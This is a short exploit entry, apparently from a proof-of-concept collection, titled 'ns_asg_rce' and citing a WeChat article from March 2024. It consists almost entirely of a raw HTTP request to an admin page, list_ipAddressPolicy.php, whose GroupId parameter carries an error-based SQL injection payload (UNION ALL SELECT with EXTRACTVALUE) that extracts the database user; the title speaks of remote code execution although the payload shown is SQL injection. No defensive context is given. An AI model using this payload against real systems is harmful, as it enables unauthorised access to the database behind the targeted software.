# ns_asg_rce

from:   https://mp.weixin.qq.com/s/GlnU-MgodF6qzSufXipwiw
2024.3.8 @2
```
GET /admin/list_ipAddressPolicy.php?GroupId=-1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+user()),0x7e)) HTTP/1.1
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.9
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
```
